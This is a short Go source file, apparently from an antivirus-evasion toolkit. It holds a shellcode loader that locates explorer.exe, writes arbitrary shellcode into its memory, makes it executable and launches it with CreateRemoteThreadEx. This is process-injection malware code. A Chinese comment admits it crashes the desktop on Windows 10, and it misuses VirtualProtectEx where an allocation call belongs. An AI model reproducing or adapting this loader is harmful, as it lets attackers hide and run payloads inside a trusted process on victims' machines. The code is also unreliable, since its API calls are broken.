package Loader

import (
	"GoAnti-VirusX/API"
	"github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
	"unsafe"
)

// CreateRemoteThreadNativeLoader Windows 10 测试不成功，会造成桌面重启
func CreateRemoteThreadNativeLoader(shellcode []byte) {
	api, _ := API.SetWindowsAPI()

	processList, err := ps.Processes()
	if err != nil {
		return
	}
	var pid int
	for _, process := range processList {
		if process.Executable() == "explorer.exe" {
			pid = process.Pid()
			break
		}
	}

	pHandle, _, _ := api.OpenProcess().Call(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uintptr(uint32(pid)))

	addr, _, _ := api.VirtualProtectEx().Call(pHandle, 0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)

	_, _, _ = api.WriteProcessMemory().Call(pHandle, addr, (uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)))

	oldProtect := windows.PAGE_READWRITE
	_, _, _ = api.VirtualProtectEx().Call(pHandle, addr, uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	_, _, _ = api.CreateRemoteThreadEx().Call(pHandle, 0, 0, addr, 0, 0, 0)
	_, _, _ = api.CloseHandle().Call(uintptr(uint32(pHandle)))

}
